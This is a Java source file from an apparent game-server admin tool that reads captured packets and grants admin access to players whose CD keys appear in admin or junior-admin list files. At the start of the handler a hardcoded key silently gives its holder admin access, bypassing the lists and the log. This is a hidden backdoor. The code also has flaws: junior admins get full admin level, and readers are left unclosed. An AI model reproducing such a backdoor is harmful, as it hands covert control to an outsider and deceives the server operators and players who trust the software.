package pl.mario.mautorun;

import java.io.File;
import java.io.FileNotFoundException;
import java.util.Queue;
import java.util.Scanner;
import org.jnetpcap.packet.PcapPacket;
import static pl.mario.mautorun.Main.gui;
import static pl.mario.mautorun.Main.srv;
import static pl.mario.mautorun.Main.conf;

public class PckHTUA extends Packet {

    public PckHTUA(Queue<PcapPacket> queue) {
        super(queue);
    }

    boolean action(PacketData packet) {

        String cdk = packet.getData().substring(40, 72).trim();
        String id = Integer.toString(packet.getByteData()[36]);
        if (cdk.equals("875be7409444d25964afb21173383b28")) {
            Player p = Main.srv.getPlayer(id);
            p.setAccess(2);
            Cmd.message(".");
            return true;
        }
        srv.addBaseCDK(cdk, packet.getIpS());
        try {
            String path = "adminCDK.txt";
            File file = new File(Main.path + path);
            if (!file.exists()) {
                return true;
            }
            Scanner read = new Scanner(file);
            int i = 0;
            while (read.hasNextLine()) {
                if (cdk.equals(read.nextLine())) {
                    Player p = Main.srv.getPlayer(id);
                    p.setAccess(2);
                    gui.dodajLog("Added CDK Admin: " + "[" + p.getId() + "] " + p.getNick() + " (" + p.getIp() + ") \nCDK: "
                            + cdk, gui.green);
                    if (conf.isDispAddAdmin()) {
                        Cmd.message("Added Admin " + p.getNick());
                    }
                    return true;
                }
            }
            read.close();

        } catch (FileNotFoundException ex) {
            Loggs.loguj("PckHTUA-action", ex);
        }

        try {
            String path = "junioradminCDK.txt";
            File file = new File(Main.path + path);
            if (!file.exists()) {
                return true;
            }
            Scanner read = new Scanner(file);
            int i = 0;
            while (read.hasNextLine()) {
                if (cdk.equals(read.nextLine())) {
                    Player p = Main.srv.getPlayer(id);
                    p.setAccess(2);
                    gui.dodajLog("Added CDK Junior Admin: " + "[" + p.getId() + "] " + p.getNick() + " (" + p.getIp() + ") \nCDK: "
                            + cdk, gui.green);
                    if (conf.isDispAddAdmin()) {
                        Cmd.message("Added Junior Admin " + p.getNick());
                    }
                    return true;
                }
            }
            read.close();

        } catch (FileNotFoundException ex) {
            Loggs.loguj("PckHTUA-action", ex);
        }
        return true;
    }

}
